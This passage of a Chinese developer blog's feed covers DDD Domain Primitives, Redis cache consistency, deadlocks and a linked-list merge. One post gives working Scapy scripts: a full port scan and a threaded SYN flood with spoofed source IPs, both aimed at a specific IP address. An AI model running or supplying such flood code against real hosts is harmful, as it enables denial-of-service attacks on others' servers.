src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403194132902.png" class><p>此时一旦改变需要测试的成本不言而喻</p><h3 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h3><img src="/2022/04/02/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%BA%8C%EF%BC%89EntityAndDomainService/image-20220403194441350.png" class><p>如图为领域驱动设计的一些思想和设计过程，在日常设计中我们一定要去遵循高内聚、低耦合的思想</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;根据上一篇文章，我们主要是引入了DP这个概念，简单来说，DP就是构建领域的基础类型，并通过对一个实际例子的改造，展示了DP在明确接口语义，内聚隐形逻辑，简化单元测试方面的作用。本期我们将通过拓展这个业务案例来引入新的概念Entity&amp;amp;DomainService。同时</summary>
      
    
    
    
    <category term="DDD" scheme="http://example.com/categories/DDD/"/>
    
    
    <category term="DDD" scheme="http://example.com/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>DDD入门五板斧（一）DomainPrimitive</title>
    <link href="http://example.com/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/"/>
    <id>http://example.com/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/</id>
    <published>2022-04-01T10:06:22.000Z</published>
    <updated>2022-04-03T11:51:41.981Z</updated>
    
    <content type="html"><![CDATA[<p>DDD入门五板斧（一）Domain Primitive</p><p>DDD即Domain-Driven Design，领域驱动设计是现在一种很火的设计思想。</p><p> 什么是领域？</p><p>暂且理解为“业务问题的范畴”</p><p>领域可大可小，对应着大小业务问题的边界，简单来说领域驱动设计就是将业务上要做的一件大事通过推演和抽象，拆分为多个内聚的领域，这是为了去降低软件开发维护复杂度，遵循解耦的原则。</p><h2 id="进入业务"><a href="#进入业务" class="headerlink" title="进入业务"></a>进入业务</h2><p>假如我们现在做一个简单的数据统计系统，地推员输入客户姓名和手机号。根据客户手机号的归属地和所属运营商，将客户群体分组，分配给相应销售组，由销售组跟进后续业务。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403164902553.png" class><p>如图为实现流程图</p><p>我们定义一个User类，一个注册接口的具体实现类，注册方法先对参数进行校验然后通过手机号分别获得归属地编号和运营商编号，然后通过这两个编号去查询数据，获取分组编号，最后构造用户对象来存入数据表</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403165228812.png" class><p>这样写的代码在我们的小项目里又快又好，非常合适。</p><p>但是如果是在一个大项目里面呢？</p><p><strong>注意：</strong>我们学习DDD不是为了去对所有简单的逻辑都去进行重构，而是为了去为了项目能适应复杂的需求变化</p><p>下面我们去分析以上的代码</p><h3 id="接口语义与参数校验"><a href="#接口语义与参数校验" class="headerlink" title="接口语义与参数校验"></a>接口语义与参数校验</h3><p>User类有两个参数：一个username，一个phone，都是String类型，当这个代码被编译以后，方法只会去保留参数类型而没有参数名，假如这个代码被其他的程序员去调用，其他人并不了解内部逻辑，很有可能会颠倒参数顺序</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403165944297.png" class><p>这种情况在编译期间无法被检测。</p><p>假如未来系统支持通过用户名和身份证号码去进行注册，身份证号是String，这个时候register就会被改造为两个方法：registerByPhone和registerByIdCard两个方法。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403170258821.png" class><p>假如以后又会有新的变化，我们如何去让接口有足够明确的无歧义、可拓展性呢？最好带有一定的自检性</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403170452214.png" class><p>首先看这里的对参数值进行校验，这里的参数校验会有很多的参数校验代码，一旦一部分参数修改就需要全部去修改，这很不符合开闭原则。有什么优化方法？</p><ol><li>封装一个工具类</li></ol><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403170722553.png" class><p>改造成上面的样子，这样会去解决一部分问题，但是还不算是一种最佳实践，因为它还存在两个缺点，第一：业务内部还是需要去主动调用工具类去进行校验，假如有一天用户名不再需要校验，那还是要去修改原来的代码。第二：一旦参数类型越来越多，那工具类的校验逻辑会不断地膨胀，后续很难去维护。</p><h4 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h4><ol><li>接口语义不够明确，很容易发生问题，可拓展性不强</li><li>参数校验逻辑复用，高内聚</li><li>参数校验和业务逻辑异常解耦。</li></ol><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>语义可拓展性是因为多个属性都是String类型，会发生混淆，可拓展性不强是因为使用了基本参数类型和参数个数写死了。</p><p>首先，用户的个人属性必不可少，那我们是否可以将对于属性的校验逻辑封装到一个自定义类型种呢？这样接口只会接收到通过校验的参数，这很合理，还有一个好处，就是自然而然将参数校验与业务逻辑分开。</p><p>我们可以去创建一个PhoneNumber类，在构建这个类的时候我们去自动执行校验逻辑，这样就能确保被构建出来的对象一定是合法的</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403172434729.png" class><p>这样就不再需要业务方法内部去对参数进行校验，而且将不同类型的逻辑聚合到了属性自身，不再分散于工具类种进行管理，此外，方法的签名中因为使用了自定义类型，不仅语义更加清晰，而且在编译期间就会进行强类型校验，避免传参乱序这种低级错误</p><p>经过改造的代码如图所示：</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403172913892.png" class><p>我们可以看到：接口的语义更加清晰，拥有一定的可拓展性，对于参数的校验也更加内聚。除此之外核心业务逻辑</p><h3 id="核心业务逻辑的清晰度"><a href="#核心业务逻辑的清晰度" class="headerlink" title="核心业务逻辑的清晰度"></a>核心业务逻辑的清晰度</h3><p>经过改造的代码更加优雅，但是它是否真的“纯粹”？</p><p>registerationService用于对用户进行注册的服务，那它的定义应该是仅仅用于注册。</p><p>什么是注册？</p><p>注册就是拿到用户信息进行存储，这样就能让业务逻辑简单易读。</p><p>而这段代码的两个行为，一个是“获取手机号归属地编码”，一个是“获取运营商编码”</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403173339531.png" class><p>把这个放在注册的业务领域显然不合适，什么逻辑应该归属于哪个业务域，这就是对于“领域”的理解。不同的理解角度会产生不同的领域模型划分，那“获取手机号归属地编码”&amp;“获取运营商编码”不属于注册领域，那我们为什么要在register方法里写这个逻辑？仅仅是为了给findRep方法去准备参数？这就像是拿胶水逻辑进行缝缝补补，那如何去改善胶水逻辑呢？</p><ol><li>改造接口的入参</li></ol><p>假如方法的入参类型为phoneNumber，也就是直接通过手机号就能查到运营商编号，那就不哟用操作了</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403174425749.png" class><ol start="2"><li>不能修改传参类型</li></ol><p>“获取手机号归属地编码”&amp;“获取运营商编码”这两个行为都是获取手机号相关的属性，应该内聚于手机号这个类型中，这在抽象上也是合理的。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403174819064.png" class><p>如图，我们把“获取手机号归属地编码”&amp;“获取运营商编码”放在了PhoneNumber类中。</p><img src="/2022/04/01/DDD/DDD%E5%85%A5%E9%97%A8%E4%BA%94%E6%9D%BF%E6%96%A7%EF%BC%88%E4%B8%80%EF%BC%89DomainPrimitive/image-20220403174912049.png" class><p>此时原先的注册业务就会十分简单。</p><h3 id="测试单元可行性"><a href="#测试单元可行性" class="headerlink" title="测试单元可行性"></a>测试单元可行性</h3><p>通过上述方法，我们不同于以往的测试，往往一个业务需求的改变牵一发而动全身，现在可以实实在在的减少测试成本，而且测试成本越来越小。</p><p>在传统的POJO中，类中只包含getter、setter方法，而这里的PhoneNumber却包含初始化、校验、属性处理等多种逻辑，这就是DD与传统MVC开发最重要的差异点，像我们上面提到的PhoneNumber不仅拥有属性，而且包含了与其属性的相关职责，这就属于<strong>充血模型</strong>，而传统的POJO就属于<strong>贫血模型</strong>。而如何去把握充血的强弱程度，这就需要很丰富的经验了。</p><p><strong>DP(Domain Primitive)</strong></p><p>在DDD里，DP可以说是一切模型、方法、架构的基础。它是在特定领域、拥有精准定义、可以自我验证、拥有行为的对象。可可以认为是领域的最小组成部分。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;DDD入门五板斧（一）Domain Primitive&lt;/p&gt;
&lt;p&gt;DDD即Domain-Driven Design，领域驱动设计是现在一种很火的设计思想。&lt;/p&gt;
&lt;p&gt; 什么是领域？&lt;/p&gt;
&lt;p&gt;暂且理解为“业务问题的范畴”&lt;/p&gt;
&lt;p&gt;领域可大可小，对应着大小业</summary>
      
    
    
    
    <category term="DDD" scheme="http://example.com/categories/DDD/"/>
    
    
    <category term="DDD" scheme="http://example.com/tags/DDD/"/>
    
  </entry>
  
  <entry>
    <title>Redis与数据库数据一致性</title>
    <link href="http://example.com/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/"/>
    <id>http://example.com/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/</id>
    <published>2022-03-28T14:36:23.000Z</published>
    <updated>2022-04-03T14:56:32.977Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，redis作为一种缓存位于应用与数据库中间，用来实现应用和数据库的读操作的缓存层，主要目的就是为了减少数据库的IO</p><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403223914229.png" class><p>当用户去查询数据的时候，如果命中缓存，那就直接返回，如果没有命中就从数据库查询，查到数据以后，再去把数据缓存到redis。</p><p>此时我们假设我们要去更新redis和MySQL，而更新操作是有先后顺序的，它不像MySQL中事务的原子性，所以数据很有可能出现短暂的不一致</p><h3 id="先更新数据库后更新缓存"><a href="#先更新数据库后更新缓存" class="headerlink" title="先更新数据库后更新缓存"></a>先更新数据库后更新缓存</h3><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403224317813.png" class><p>此时如果缓存更新失败，就会导致数据库和redis的数据发生不一致，</p><h3 id="先删除缓存后更新数据库"><a href="#先删除缓存后更新数据库" class="headerlink" title="先删除缓存后更新数据库"></a>先删除缓存后更新数据库</h3><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403224433006.png" class><p>当下次访问redis的时候，此时如果发现redis数据为空，那就会从MySQL中加载并且保存到redis，也就是说数据库理论上是一致的，但是毕竟事件存在一点点时差，难免造成数据不一致的问题</p><h3 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h3><h4 id="基于RocketMQ的消息可靠性通信"><a href="#基于RocketMQ的消息可靠性通信" class="headerlink" title="基于RocketMQ的消息可靠性通信"></a>基于RocketMQ的消息可靠性通信</h4><img src="/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%B8%80%E8%87%B4%E6%80%A7/image-20220403224802430.png" class><p>先更新数据库的数据，然后去修改redis数据，如果此时删除失败，可以用消息中间件去传递消息，知道修改成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们知道，redis作为一种缓存位于应用与数据库中间，用来实现应用和数据库的读操作的缓存层，主要目的就是为了减少数据库的IO&lt;/p&gt;
&lt;img src=&quot;/2022/03/28/Redis/Redis%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%</summary>
      
    
    
    
    <category term="Redis" scheme="http://example.com/categories/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>死锁</title>
    <link href="http://example.com/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/"/>
    <id>http://example.com/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/</id>
    <published>2022-03-24T14:47:55.000Z</published>
    <updated>2022-03-24T15:44:21.907Z</updated>
    
    <content type="html"><![CDATA[<h3 id="死锁与饥饿"><a href="#死锁与饥饿" class="headerlink" title="死锁与饥饿"></a>死锁与饥饿</h3><img src="/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%AD%BB%E9%94%81/image-20220324234351318.png" class><p>死锁：各个进程相互等待对方手里的资源，导致各个进程都阻塞，无法向前继续推进的现象。</p><p>饥饿：若长期得不到想要的资源，某进程无法向前推进的现象。</p><p>死锁的进程是处于阻塞态的，多个进程都无法运行了，而饥饿是还在运行，只是有一个进程一直得不到处理</p><h3 id="死锁的四个条件"><a href="#死锁的四个条件" class="headerlink" title="死锁的四个条件"></a>死锁的四个条件</h3><ul><li>不剥夺条件</li></ul><p>进程所获得的资源在未使用完之前，不能由其他进程强行夺走，只能主动释放</p><ul><li>请求和保持条件</li></ul><p>进程以及至少占用了一个资源，但是又提出了新的资源请求，而该资源又被其他的进程占有，又对于自身的资源保持不放</p><ul><li>循环等待</li></ul><p>若干个进程资源存在循环等待链，链条中每个进程都被下一个进程请求</p><p>现在假设一个场景，两个小孩都想尝一下两个苹果，但是它们一次只能拿着一个苹果吃一口，现在A吃完了自己手上的苹果，然后B吃完了自己手上的苹果，现在A想去拿B的苹果，B又想去拿A的苹果，但是两个小孩都很不懂事，它们都不行自己先去放下自己手中的苹果，那双方就会一直这样僵持下去。这就是死锁</p><h2 id="死锁的处理"><a href="#死锁的处理" class="headerlink" title="死锁的处理"></a>死锁的处理</h2><h3 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h3><p>对于死锁形成的四个必要条件，那就会有四种不同的破坏策略</p><ul><li>互斥条件</li></ul><p>只有互斥的资源的争抢才会形成死锁，因为资源只能被一个进程享受。可以看看释放能将资源改为共享的，比如把苹果放在桌子上，两个小孩都可以去同时咬。</p><ul><li>不剥夺条件</li></ul><p>当进程得不到想要的资源的时候可以去考虑释放自己的资源，然后尝试去再次获取</p><p>但是这样容易前功尽弃，以前好不容易申请的资源又释放了</p><ul><li>请求和保持</li></ul><p>进程在运行前先去得到他所需要的全部资源这样就不会去争抢资源了，但是这是很难去实现的</p><ul><li>循环等待</li></ul><p>可采用顺序资源分配法，首先给系统资源编号，每个进程去按顺序请求资源，这样就不会循环等待了，但是这个时候如果又新增的进程，这就会很不方便</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;死锁与饥饿&quot;&gt;&lt;a href=&quot;#死锁与饥饿&quot; class=&quot;headerlink&quot; title=&quot;死锁与饥饿&quot;&gt;&lt;/a&gt;死锁与饥饿&lt;/h3&gt;&lt;img src=&quot;/2022/03/24/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E</summary>
      
    
    
    
    <category term="操作系统" scheme="http://example.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>浅试Scapy</title>
    <link href="http://example.com/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/"/>
    <id>http://example.com/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/</id>
    <published>2022-03-24T13:44:34.000Z</published>
    <updated>2022-03-24T14:09:51.776Z</updated>
    
    <content type="html"><![CDATA[<p>在我的计算机网络分类里很早之前就有一篇关于计算机网络的文章，那里只是对于计算机网络的常见攻击手段进行了简单讲解，今天我利用scapy模拟了一下scapy的SYN洪水攻击。</p><p>对于SYN洪水不了解的可以看我以前的<a href="https://andersonlee09.github.io/2022/02/17/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E8%A1%8C%E4%B8%BA%E9%89%B4%E8%B5%8F/#SYN%E6%B4%AA%E6%B0%B4">文章</a></p><p>我们知道一般的网站都是部署在Linux服务器上的，所以在攻击目标网址之前先要知道目标的IP以及暴露端口</p><img src="/2022/03/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%B5%85%E8%AF%95Scapy/image-20220324215916212.png" class><p>利用windows或者Linux自带的ping命令就可以获取对方IP，但是怎么知道目标暴露端口？</p><ul><li>通过抓包软件</li></ul><p>通过wireshark抓包软件抓取数据包，然后通过数据包来分析对方IP暴露情况，这里不进行讲解，关于wireshark的使用可以看我以前的文章</p><ul><li>通过scapy</li></ul><p>scapy是一个非常强大的python第三方库，它提供了构造、解析以及发送和接收数据包的功能，而我们可以对于目标IP的不同端口发送TCP包，如果能在一定时间收到IP就说明该端口暴露，否则不暴露</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, TCP<br><br><span class="hljs-comment"># 清除提示</span><br>conf.verb = <span class="hljs-number">0</span><br><span class="hljs-comment"># the port of ip u want to search</span><br>ip = <span class="hljs-string">&quot;121.43.175.217&quot;</span><br><span class="hljs-comment"># lis = [2250, 3246, 5001, 6432]</span><br><span class="hljs-keyword">for</span> dst_port <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>):<br>    pkt = IP(dst=ip) / TCP(dport=dst_port)<br>    ans = sr(pkt, timeout=<span class="hljs-number">0.1</span>)<br>    <span class="hljs-comment"># print(ans)</span><br>    <span class="hljs-comment"># print(type(ans))</span><br>    <span class="hljs-comment"># print(ans[0])</span><br>    <span class="hljs-comment"># print(type(ans[0]))</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(ans[<span class="hljs-number">0</span>]):<br>        <span class="hljs-built_in">print</span>(dst_port)<br></code></pre></td></tr></table></figure><p>可以看到代码其实非常简单，遍历不同的对方端口，然后是否能收到的数据包是否正常就可以了</p><p>接下来我们讲解攻击的过程</p><p>首先我在这里模拟了1000个IP用于伪造自己的IP，然后利用自己电脑的不同端口向目标IP端口发起攻击，开启了10个线程同时进行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scapy<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, ICMP, TCP<br><span class="hljs-keyword">from</span> scapy.sendrecv <span class="hljs-keyword">import</span> send, sr1, sr, srp1<br><span class="hljs-keyword">from</span> scapy.utils <span class="hljs-keyword">import</span> rdpcap<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-comment"># 攻击的IP</span><br>dst = <span class="hljs-string">&quot;121.43.175.217&quot;</span><br><span class="hljs-comment"># 目标端口</span><br>dst_port = <span class="hljs-number">6342</span><br><span class="hljs-comment"># 随机生成1000个IP</span><br>num = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">256</span>))<br>my_ip = [<span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(random.choice(num)) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(<br>    random.choice(num)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>)]<br><span class="hljs-built_in">print</span>(my_ip)<br><span class="hljs-comment"># pkt = IP(src=dst) / TCP()  # 要发生的包</span><br><span class="hljs-comment"># print(pkt.show())</span><br><span class="hljs-comment"># res = sr1(pkt)  # send receive 1  这里收到 1个包</span><br><span class="hljs-comment"># res = sr()  # send and receive  这里收到 所有 包</span><br><span class="hljs-comment"># res = send()  # 只发不收</span><br><span class="hljs-comment"># res = srp1()  # 只发送两层  不发送传输层</span><br><span class="hljs-comment"># print(res.summary())</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">synFlood</span>():<br>    <span class="hljs-keyword">for</span> src_ort <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>, <span class="hljs-number">65535</span>):<br>        ipLayer = IP(src=random.choice(my_ip), dst=dst)<br>        tcpLayer = TCP(sport=src_ort, dport=dst_port, flags=<span class="hljs-string">&quot;S&quot;</span>)<br>        pkt = ipLayer / tcpLayer<br>        send(pkt)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        threading.Thread(target=synFlood).start()<br></code></pre></td></tr></table></figure><p>因为个人PC能造成的杀伤实在有限，可能难以造成肉眼可见的效果，但是当PC多了以后就能形成Ddos攻击，这里只是分享一种实现方法~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在我的计算机网络分类里很早之前就有一篇关于计算机网络的文章，那里只是对于计算机网络的常见攻击手段进行了简单讲解，今天我利用scapy模拟了一下scapy的SYN洪水攻击。&lt;/p&gt;
&lt;p&gt;对于SYN洪水不了解的可以看我以前的&lt;a href=&quot;https://andersonl</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>CodingInterview25合并两个排序链表</title>
    <link href="http://example.com/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/"/>
    <id>http://example.com/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/</id>
    <published>2022-03-21T15:42:49.000Z</published>
    <updated>2022-03-22T02:38:08.201Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为在准备东西的时候发现自己还有很多不足，一直在学习操作系统的有关东西，加上也在熟悉公司业务，算法也有在做，但是写算法的题解耗时非常久，因为要写分析和画图，今天分享一道常规的链表题目：<a href="https://leetcode-cn.com/problems/he-bing-liang-ge-pai-xu-de-lian-biao-lcof/">剑指 Offer 25. 合并两个排序的链表</a>，一周以后关于操作系统的相关东西我差不多就整理完毕了，到时候我会专心写题解的</p><p>这道题我们乍一看脑袋里肯定会有一定的思想的，比如以前在学习mergeSort的时候我们经常会去合并两个有序数，而合并数组和链表其实是很相似的</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220321235226968.png" class><h3 id="迭代法"><a href="#迭代法" class="headerlink" title="迭代法"></a>迭代法</h3><p>这就是对两个链表依次处理就可以了</p><p>如图，我们想合并l1&amp;l2两个链表，首先我们肯定是从前到后，把比较小的元素一次放入另一个链表里面</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220321235546578.png" class><p>我们做链表类的题目第一件事一定要先去想是否需要去创建一个dummyhead（假头），dummyhead在链表类题目是十分常用的，因为在处理第一个元素的时候十分麻烦，<strong>为什么？</strong></p><p>比如有时候两个链表都为空的时候那合成的第三个链表一定为空，那返回的时候我们就要去判断如果头为空怎样，如果不为空又怎样</p><p>而如果有了dummyhead以后就会直接返回dummyhead.next</p><p>言归正传，我们用一个node节点刚开始去指向dummyhead节点如图</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220322000241509.png" class><p>每次去挑选原来的两个链表的最小节点</p><img src="/2022/03/21/Algo/CodingInterview25%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/image-20220322000420601.png" class><p>如图此时1最小，我们就把1放在node后面，然后让node&#x3D;node.next</p><p>等到两个链表有一个链表（假设为链表1）元素全部放完以后，直接让node.next&#x3D;链表2剩下的所有节点</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for singly-linked list.</span><br><span class="hljs-comment"> * public class ListNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     ListNode next;</span><br><span class="hljs-comment"> *     ListNode(int x) &#123; val = x; &#125;</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> ListNode <span class="hljs-title function_">mergeTwoLists</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> &#123;<br>        <span class="hljs-type">ListNode</span> <span class="hljs-variable">dummyHead</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListNode</span>(-<span 